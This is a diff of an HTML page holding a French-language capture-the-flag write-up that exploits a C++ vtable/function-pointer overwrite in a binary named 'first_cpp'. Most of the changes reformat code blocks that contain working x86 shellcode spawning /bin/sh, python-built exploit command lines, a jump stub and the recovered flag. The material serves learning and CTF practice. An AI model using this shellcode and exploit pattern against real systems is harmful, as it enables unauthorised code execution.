-</pre></td><td class="code"><pre>"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>./first_cpp <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x89\xe0\x83\xc0\x78\xff\xe0" + "\xd9\x9d\x04\x08" + "\xce\x9d\x04\x08" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa" + "\xd5\x9d\x04\x08" + "\x90" * 128 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'</span><span class="sb">`</span> 10</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>./first_cpp <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x89\xe0\x83\xc0\x78\xff\xe0" + "\xd9\x9d\x04\x08" + "\xce\x9d\x04\x08" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa" + "\xd5\x9d\x04\x08" + "\x90" * 128 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'</span><span class="sb">`</span> 10
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Le jump code est le suivant:</p>
 
@@ -637,11 +636,12 @@ fct  = 0x08049dce</pre></td></tr></tbody></table></code></pre></figure>
 3
 4
 5
-</pre></td><td class="code"><pre><span class="n">BITS</span> <span class="mi">32</span>
+</pre></td><td class="code"><pre><span class="k">BITS</span> <span class="mi">32</span>
 
-<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">esp</span>
-<span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">120</span>
-<span class="k">jmp</span> <span class="n">eax</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">120</span>
+<span class="nf">jmp</span> <span class="nb">eax</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Avec ce pattern on saute sur la stack pour exécuter notre code.</p>
 
@@ -655,7 +655,8 @@ Pattern plus propre permettant d’avoir tout dans le buffer global:</p>
 </pre></td><td class="code"><pre>[ ptr (4bytes)  ] [ fct ptr (4 bytes) ] [ payload1 (23 bytes ] [ junk (5 bytes)]
 this = 0x08049dce = address of ptr
 ptr  = 0x08049dd2
-fct  = 0x08049dd6</pre></td></tr></tbody></table></code></pre></figure>
+fct  = 0x08049dd6
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>En vrai en stack on a la chose suivante:</p>
 
@@ -666,19 +667,22 @@ fct  = 0x08049dd6</pre></td></tr></tbody></table></code></pre></figure>
 </pre></td><td class="code"><pre>[ ptr (4bytes)  ] [ fct ptr (4 bytes) ] [ payload1 (23 bytes ] [ junk (13 bytes)] [ this (4bytes) ] [ payload2 ]
 this = 0x08049dce = address of ptr
 ptr  = 0x08049dd2
-fct  = 0x08049dd6</pre></td></tr></tbody></table></code></pre></figure>
+fct  = 0x08049dd6
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 3
 </pre></td><td class="code"><pre><span class="nv">$ </span>./first_cpp <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\xd2\x9d\x04\x08" + "\xd6\x9d\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "\x90" * 13 + "\xce\x9d\x04\x08"'</span><span class="sb">`</span> 10
 <span class="nv">$ </span><span class="nb">cat </span>key
-Virtual_function_is_Virtue</pre></td></tr></tbody></table></code></pre></figure>
+Virtual_function_is_Virtue
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Dans le buffer global on a ainsi l’équivalent suivant:</p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="n">global_buffer</span> <span class="o">=</span> <span class="s">"Uploading..."</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xd2\x9d\x04\x08</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xd6\x9d\x04\x08</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">5</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="n">global_buffer</span> <span class="o">=</span> <span class="s">"Uploading..."</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xd2\x9d\x04\x08</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xd6\x9d\x04\x08</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">5</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Et voilà, pawned,</p>
 
@@ -794,6 +798,26 @@ Virtual_function_is_Virtue</pre></td></tr></tbody></table></code></pre></figure>
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
